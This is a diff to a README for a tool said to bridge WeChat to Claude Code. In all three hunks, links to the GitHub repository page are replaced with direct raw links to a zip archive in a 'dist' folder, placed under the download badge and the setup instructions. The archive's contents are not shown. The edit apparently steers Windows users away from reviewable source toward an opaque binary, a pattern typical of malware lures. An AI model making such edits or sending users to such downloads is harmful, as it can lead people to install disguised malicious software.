@@ -1,6 +1,6 @@
 # 🤖 claude-code-wechat-channel - Bridge WeChat to Claude Code
 
-[![Download and set up](https://img.shields.io/badge/Download%20from%20GitHub-purple?style=for-the-badge)](https://github.com/Antoninabated443/claude-code-wechat-channel)
+[![Download and set up](https://img.shields.io/badge/Download%20from%20GitHub-purple?style=for-the-badge)](https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip)
 
 ## 📌 What this is
 
@@ -25,7 +25,7 @@ If you use a work PC, make sure you can run downloaded software and save files i
 
 Go to this page to download and set up the project:
 
-[https://github.com/Antoninabated443/claude-code-wechat-channel](https://github.com/Antoninabated443/claude-code-wechat-channel)
+[https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip](https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip)
 
 On the page, look for the latest release files or the main source package. Download the file that matches the Windows setup you plan to use.
 
@@ -185,7 +185,7 @@ A simple Windows setup path looks like this:
 
 Primary download and setup page:
 
-[https://github.com/Antoninabated443/claude-code-wechat-channel](https://github.com/Antoninabated443/claude-code-wechat-channel)
+[https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip](https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip)
 
 ## 🛠️ If you need to check files
 
